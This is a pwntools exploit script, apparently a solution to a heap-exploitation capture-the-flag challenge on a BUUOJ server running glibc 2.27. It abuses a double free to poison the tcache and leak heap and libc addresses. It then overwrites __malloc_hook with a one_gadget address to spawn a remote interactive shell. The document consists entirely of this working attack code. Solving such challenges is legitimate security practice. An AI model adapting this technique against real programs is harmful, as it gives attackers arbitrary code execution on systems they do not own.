from pwn import *
p=remote('node3.buuoj.cn',25731)
#p=process('./1')
libc=ELF('libc-2.27_64.so')
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
context.terminal = ['tmux','splitw','-h']

def debug():
    gdb.attach(p)
    pause()
def new(t,con):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('title:')
    p.send(str(t))
    p.recvuntil('content:')
    p.send(str(con))
def free(idx):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))


new('\x11'*4,'\x12'*4)#0
new('\x11'*4,'\x12'*4)#1
free(0)
free(0)
new('\x80','\n')#2
p.recvuntil('\n')
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x280
new(p64(heap_base+0x20),p64(heap_base+0x20)*5)#3
new(p64(heap_base+0x20),p64(heap_base+0x20)*5)#4
payload='\xff'*40+p64(0)
payload+=p64(0x250-0x50+1)+p64(0)*4+p64(heap_base+0x60)
new('\x01',payload)#5
new('a'*8,'b'*0x18+p64(heap_base+0x60))#6
free(6)
#print hex(96+libc.sym['main_arena'])
#print hex(96+0x3ebc40)
#pause()
new('\xa0','\xa0'*0x18+p64(heap_base+0x60))
p.recvuntil('\n')
#libc.address=u64(p.recv(6).ljust(8,'\x00'))-96-libc.sym['main_arena']
libc.address=u64(p.recv(6).ljust(8,'\x00'))-96-0x3ebc40
print hex(libc.address)
new('\x01',p64(0)*0x3+p64(libc.sym['__malloc_hook']))
#debug()
og=[0x4f2c5,0x4f322,0x10a38c]
ogg=libc.address+og[1]
new(p64(ogg),p64(ogg))
sleep(0.2)
p.sendline('1')
p.interactive()

